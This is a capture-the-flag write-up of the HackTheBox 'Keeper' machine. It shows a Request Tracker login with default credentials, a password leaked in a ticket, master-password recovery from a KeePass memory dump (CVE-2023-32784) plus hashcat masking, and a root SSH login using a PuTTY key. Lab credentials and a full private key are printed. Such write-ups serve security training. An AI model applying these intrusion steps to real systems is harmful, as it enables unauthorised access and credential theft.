---
render_with_liquid: false
title: HackTheBox Writeup  Keeper
date: 2023-08-14 18:21:31 +1400
tags: [hackthebox, nmap, linux, enum, credentials-exposure, keepass2, cve-2023-32784, keepass2-memory-dump, kdbx, kpcli, osint, putty, putty-key, puttygen, keepass2john, hashcat, hashcat-mask, oscp-like-2023]
---



Keeper is an easy-difficulty Linux machine that features a support ticketing system that uses default credentials. Enumerating the service, we are able to see clear text credentials that lead to SSH access.  With `SSH` access, we can gain access to a KeePass database dump file, which we can leverage to retrieve the master password. With access to the `Keepass` database, we can access the root `SSH` keys, which are used to gain a privileged shell on the host.


# Recon
---

## Nmap

```bash

# Nmap 7.94 scan initiated Mon Aug 14 18:21:31 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p- 10.10.11.227
Nmap scan report for 10.10.11.227
Host is up, received user-set (0.20s latency).
Scanned at 2023-08-14 18:21:31 CST for 647s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKHZRUyrg9VQfKeHHT6CZwCwu9YkJosNSLvDmPM9EC0iMgHj7URNWV3LjJ00gWvduIq7MfXOxzbfPAqvm2ahzTc=
|   256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBe5w35/5klFq1zo5vISwwbYSVy1Zzy+K9ZCt0px+goO
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Mon Aug 14 18:32:18 2023 -- 1 IP address (1 host up) scanned in 647.33 seconds
```

Add to hosts

```bash
echo '10.10.11.227 tickets.keeper.htb keeper.htb' | tee -a /etc/hosts
```

## 80 - Website : Request Tracker 4.4.4


### Info

![](/assets/obsidian/610dc6e24c32e495304192da21868414.png)

![](/assets/obsidian/56d776cb8aa93fcc10a0843d8a0b1294.png)


# User Flag
---

## Login to request tracker as root with default creds

![](/assets/obsidian/2992bd1ca7c0c920d44ced730be55220.png)

Search `request tracker 4.4.4 default credential`

![](/assets/obsidian/c2dba93a07a8a7a547b42ec335de9c0c.png)

Logged in with `root:password`

![](/assets/obsidian/7801790931619a22a74715feb555bae8.png)

![](/assets/obsidian/874b3df48ef35fbbbf8bb7b13984e83e.png)

## User credential exposed in a ticket's comment

![](/assets/obsidian/98d0c065b5a8e491d0edb5a3e710fc13.png)

![](/assets/obsidian/ab5d7d84238fb9102697c6f204077745.png)

![](/assets/obsidian/cad33d571977637f4839377c9e07b48f.png)

![](/assets/obsidian/ba53ea166b713bdbfa142e815e0482ef.png)

After some enumerations, found user : `lnorgaard`'s password from comments

![](/assets/obsidian/66c6cee7f12333e577c6ea1330b5f191.png)

![](/assets/obsidian/70f11bc69d03d1d7645b4cf6dd78a5d0.png)

![](/assets/obsidian/09c7e8049fda60c2fe57e53861df42b4.png)

![](/assets/obsidian/73222859ea400d0276aef4a10d261903.png)

## SSH as lnorgaard

```bash
┌──(bravosec㉿fsociety)-[~/htb/Keeper]
└─$ sshpass -p 'Welcome2023!' ssh lnorgaard@keeper.htb -o "StrictHostKeyChecking no"
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have mail.
Last login: Mon Aug 14 13:30:29 2023 from 10.10.16.9
lnorgaard@keeper:~$ id
uid=1000(lnorgaard) gid=1000(lnorgaard) groups=1000(lnorgaard)
lnorgaard@keeper:~$ cat user.txt
87d3a70b8066d4b766bf3bdf6c0fb837
```


# Root Flag
---

## Get KeePass database and its memory dump

```bash
lnorgaard@keeper:~$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
lnorgaard:x:1000:1000:lnorgaard,,,:/home/lnorgaard:/bin/bash
```

```bash
lnorgaard@keeper:~$ ls -la
total 332852
drwxr-xr-x 4 lnorgaard lnorgaard      4096 Aug 14 12:10 .
drwxr-xr-x 3 root      root           4096 May 24 16:09 ..
lrwxrwxrwx 1 root      root              9 May 24 15:55 .bash_history -> /dev/null
-rw-r--r-- 1 lnorgaard lnorgaard       220 May 23 14:43 .bash_logout
-rw-r--r-- 1 lnorgaard lnorgaard      3771 May 23 14:43 .bashrc
drwx------ 2 lnorgaard lnorgaard      4096 May 24 16:09 .cache
-rwxr-x--- 1 lnorgaard lnorgaard 253395188 May 24 12:51 KeePassDumpFull.dmp
-rwxr-x--- 1 lnorgaard lnorgaard      3630 May 24 12:51 passcodes.kdbx
-rw------- 1 lnorgaard lnorgaard       807 May 23 14:43 .profile
-rw-r--r-- 1 root      root       87391651 Aug 14 13:34 RT30000.zip
drwx------ 2 lnorgaard lnorgaard      4096 Jul 24 10:25 .ssh
-rw-r----- 1 root      lnorgaard        33 Aug 14 12:07 user.txt
-rw-r--r-- 1 root      root             39 Jul 20 19:03 .vimrc
```

```bash
lnorgaard@keeper:~$ unzip -l RT30000.zip
Archive:  RT30000.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
253395188  2023-05-24 12:51   KeePassDumpFull.dmp
     3630  2023-05-24 12:51   passcodes.kdbx
---------                     -------
253398818                     2 files
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Keeper]
└─$ sshpass -p 'Welcome2023!' scp -o "StrictHostKeyChecking no" lnorgaard@keeper.htb:~/RT30000.zip .
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Keeper]
└─$ mkdir loot && cd loot

┌──(bravosec㉿fsociety)-[~/htb/Keeper/loot]
└─$ unzip ../RT30000.zip
Archive:  ../RT30000.zip
  inflating: KeePassDumpFull.dmp
 extracting: passcodes.kdbx

┌──(bravosec㉿fsociety)-[~/htb/Keeper/loot]
└─$ file passcodes.kdbx
passcodes.kdbx: Keepass password database 2.x KDBX
```

## Extract KeePass database password from memory dump

It's `keepass 2.x` database

Google : `keepass memory dump extract password`

> First Article : https://www.bleepingcomputer.com/news/security/keepass-exploit-helps-retrieve-cleartext-master-password-fix-coming-soon/?__cf_chl_tk=HtubHxEQX7qwKEdzF7qC9Lp7WlNu6JBYoEgR.0wj6ro-1692013200-0-gaNycGzNDVA

> KeePass 2.X Master Password Dumper ([CVE-2023-32784](https://nvd.nist.gov/vuln/detail/CVE-2023-32784))

> **POC**
> > https://github.com/vdohney/keepass-password-dumper
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Keeper/loot]
└─$ cp KeePassDumpFull.dmp /media/sf_kali-share/tmp/keepass-password-dumper
```

```bash
dotnet run KeePassDumpFull.dmp
```

![](/assets/obsidian/72786ef5a41e371f5f3a0d45b2c6c572.png)

Combined: 

```bash
*{,, l, `, -, ', ], A, I, :, =, _, c, M}dgr*d med fl*de
```

## Failed to crack with hashcat via mask

It seems to be like a combination of English's characters, but doesn't seem like regular words

```bash
keepass2john passcodes.kdbx > passcodes.kdbx.hash
```

```bash
hashcat -a 3 -1 ?u -2 'lAIcM' passcodes.kdbx.hash '?1?2dgr?ud med fl?ude' --user -m 13400
```

Parameter Meanings:
- `-a 3` : Brute Force Mode
- `-1` : Specify first character
- `-2` : Specify second character
- `'?1?2dgr?ud med fl?ude'` : Hashcat mask format
- `?1?2` : `Variable of first and second charactor in the mask`
- `?u` : `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`
- `--user` : Hashes extracted by **john2XXX** will be in the format of `NAME:HASH`, specify this to recognize the format
- `-m` : Hash Mode

![](/assets/obsidian/16548372e09d5b82861e2f6a7c142e6f.png)

## Retrieve the password via OSINT

I used [**searx**](https://searx.space/) to look for `**dgr*d med fl*de`, looks like a snack

![](/assets/obsidian/e24835b73a657bba9cd0b2a5922eb6d1.png)

> https://www.thespruceeats.com/rodgrod-med-flode-danish-red-berry-pudding-2952748

![](/assets/obsidian/53cc34c3be178835f076db35e45da9c9.png)

Install [keepass cli](https://github.com/rebkwok/kpcli) : `pipx install kpcli`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Keeper]
└─$ mkdir -p $HOME/.kp/

┌──(bravosec㉿fsociety)-[~/htb/Keeper]
└─$ vi $HOME/.kp/config.ini
```

```ini
[default]
KEEPASSDB=/home/kali/htb/Keeper/loot/passcodes.kdbx
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Keeper]
└─$ kpcli ls
Database: /home/kali/htb/Keeper/loot/passcodes.kdbx
UNLOCKING...

Database password:
```

Tried : `Rødgrød Med Fløde`

It works with no capital... : `rødgrød med fløde`

```bash
================================================================================
Groups
================================================================================
eMail
General
Homebanking
Internet
Network
passcodes
Recycle Bin
Windows
```

## Explore KeePass database

List all entries

```bash
┌──(bravosec㉿fsociety)-[~/htb/Keeper]
└─$ kpcli ls -e
...
================================================================================
Network
================================================================================
keeper.htb (Ticketing Server)
Ticketing System
================================================================================
passcodes
================================================================================

================================================================================
Recycle Bin
================================================================================
Sample Entry
Sample Entry #2
================================================================================
Windows
================================================================================
```

Tried a pair of creds for ssh, but failed, 

and after login to `tickets.keeper.htb` with the creds, nothing interesting found

```bash
┌──(bravosec㉿fsociety)-[~/htb/Keeper]
└─$ kpcli get 'Ticketing System' -s
Database: /home/kali/htb/Keeper/loot/passcodes.kdbx
UNLOCKING...

================================================================================
Network/Ticketing System
================================================================================
name: Network/Ticketing System
username: lnorgaard
password: Welcome2023!
URL:
Notes: http://tickets.keeper.htb

┌──(bravosec㉿fsociety)-[~/htb/Keeper]
└─$ cssh keeper.htb lnorgaard Welcome2023!
Permission denied, please try again.
```

The entries in recycle bin is rabbit hole too

```bash
┌──(bravosec㉿fsociety)-[~/htb/Keeper]
└─$ kpcli get "Sample*" -s
Database: /home/kali/htb/Keeper/loot/passcodes.kdbx
UNLOCKING...

================================================================================
Recycle Bin/Sample Entry
================================================================================
name: Recycle Bin/Sample Entry
username: User Name
password: Password
URL: https://keepass.info/
Notes: Notes
================================================================================
Recycle Bin/Sample Entry #2
================================================================================
name: Recycle Bin/Sample Entry #2
username: Michael321
password: 12345
URL: https://keepass.info/help/kb/testform.html
Notes:
```

Get the last unchecked entry (Using wildcard to search since `()` symbol needs escape...)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Keeper]
└─$ kpcli get "Network/keeper.htb*" -s
Database: /home/kali/htb/Keeper/loot/passcodes.kdbx
UNLOCKING...

================================================================================
Network/keeper.htb (Ticketing Server)
================================================================================
name: Network/keeper.htb (Ticketing Server)
username: root
password: F4><3K0nd!
URL:
Notes: PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

Tried the creds, but failed

```bash
┌──(bravosec㉿fsociety)-[~/htb/Keeper]
└─$ cssh keeper.htb root 'F4><3K0nd!'
Permission denied, please try again.
```

## Convert putty user key to openssh private key

The rsa key in notes section is interesting though

> `PuTTY-User-Key-File-3`

Search : `convert putty user key to ssh key on linux`

> https://superuser.com/questions/232362/how-to-convert-ppk-key-to-openssh-key-under-linux

Searched `putty ssh key example format` to check the correct format

![](/assets/obsidian/425e4c86a5e823de2519e0fd3f4155af.png)

```bash
vi putty.key
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Keeper]
└─$ puttygen putty.key -O private-openssh -o id_rsa.key
```

## SSH as root

Ugh... fun box

```bash
┌──(bravosec㉿fsociety)-[~/htb/Keeper]
└─$ chmod 600 putty.key

┌──(bravosec㉿fsociety)-[~/htb/Keeper]
└─$ ssh root@keeper.htb -i id_rsa.key
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Thu Aug 17 14:21:58 2023 from 10.10.14.23
root@keeper:~# id
uid=0(root) gid=0(root) groups=0(root)
root@keeper:~# cat root.txt
00c7ecbc8a98d52f52da8e2e9ac4934a
```

# Additional
---
